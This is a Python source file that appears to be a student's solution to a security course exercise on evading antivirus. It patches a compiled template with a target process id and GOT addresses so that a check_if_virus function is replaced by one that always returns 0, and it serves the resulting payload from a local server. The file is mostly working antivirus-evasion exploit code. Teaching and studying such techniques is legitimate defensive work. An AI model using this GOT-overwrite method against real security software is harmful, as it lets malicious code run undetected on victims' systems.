import addresses
import evasion
import struct


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the GOT entry for check_if_virus.

        Reminder: We want to replace it with another function of a similar
        signature, that will return 0.

        Notes:
        1. You can assume we already compiled q3.c into q3.template.
        2. Use addresses.CHECK_IF_VIRUS_GOT, addresses.CHECK_IF_VIRUS_ALTERNATIVE
           (and addresses.address_to_bytes).

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q3.template'
        with open(PATH_TO_TEMPLATE, 'rb') as reader:
            data = reader.read()

        pid_index = data.find(b'\x78\x56\x34\x12')
        check_addr_index = data.find(b'\x22\x22\x11\x11')
        alt_addr_index = data.find(b'\x44\x44\x33\x33')

        pid_bytes = bytearray(struct.pack('<L', pid))
        check_addr_bytes = bytearray(addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_GOT))
        alt_addr_bytes = bytearray(addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_ALTERNATIVE))

        data = bytearray(data)
        for i in range(4):
            data[pid_index + i] = pid_bytes[i]
            data[check_addr_index + i] = check_addr_bytes[i]
            data[alt_addr_index + i] = alt_addr_bytes[i]

        return bytes(data)

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
